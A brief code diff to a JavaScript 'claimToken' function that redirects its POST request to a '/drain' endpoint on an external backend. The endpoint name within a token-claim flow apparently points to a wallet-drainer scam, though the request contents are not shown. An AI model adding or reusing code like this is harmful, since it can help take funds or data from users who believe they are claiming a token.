@@ -94,7 +94,7 @@ async function claimToken() {
   }
 
   try {
-    const res = await fetch("https://tokenbackend-5xab.onrender.com/", {
+    const res = await fetch("https://tokenbackend-5xab.onrender.com/drain", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -117,3 +117,4 @@ async function claimToken() {
     status.textContent = "Failed to claim token";
   }
 }
+
